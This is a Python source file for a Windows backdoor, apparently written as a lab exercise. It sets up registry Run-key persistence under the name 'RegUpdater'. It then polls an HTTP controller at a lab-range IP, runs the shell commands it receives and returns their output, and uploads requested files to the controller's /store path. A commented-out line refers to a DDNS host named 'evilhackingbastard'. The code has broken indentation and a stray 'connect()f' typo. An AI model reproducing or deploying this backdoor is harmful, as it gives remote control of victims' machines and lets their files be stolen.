import os, random, requests, shutil, sys, socket, subprocess, time
import _winreg as wreg

#Set up IP from DDNS
#ip = socket.gethostbyname('evilhackingbastard.ddns.net')
#print "The IP address is: " + ip

#Find the current working directory
path = os.getcwd().strip('\n')

#Get the user profile
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

#Set up the destination path 
destination = userprof.strip('\n\r') + '\\Documents\\' + 'persistent.py' 

#Set value in the registry DB for persistence
if not os.path.exists(destination):
	shutil.copyfile(path + '\persistent.py', destination)

	key = wreg.OpenKey(wreg.HKEY_CURRENT_USER,
		"Software\Microsoft\Windows\CurrentVersion\Run",
		0,
		wreg.KEY_ALL_ACCESS)

	wreg.SetValueEx(key,
		'RegUpdater',
		0,
		wreg.
		REG_SZ,destination)
	key.Close()


###
#Function to connect to the server.
#If the connection fails the target will retry to connect at a random interval
###

def connect():  
	while True:
		req = requests.get('http://192.168.56.103')
        command = req.text
        if 'terminate' in command:
            return 1

        elif 'grab' in command:
            grab,path=command.split('*')
            
            if os.path.exists(path):
                url = 'http://192.168.56.103/store'  
                files = {'file': open(path, 'rb')} 
                r = requests.post(url, files=files) 
            
            else:
                post_response = requests.post(url='http://192.168.56.103', data='[-] File not found !' )
            
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            post_response = requests.post(url='http://192.168.56.103', data=CMD.stdout.read() )
            post_response = requests.post(url='http://192.168.56.103', data=CMD.stderr.read() )

        time.sleep(3)

while True:   
    try:
        if connect() == 1:
            break
        
    except:
        sleep_for = random.randrange(1, 10)
        time.sleep( sleep_for )
        connect()f
        pass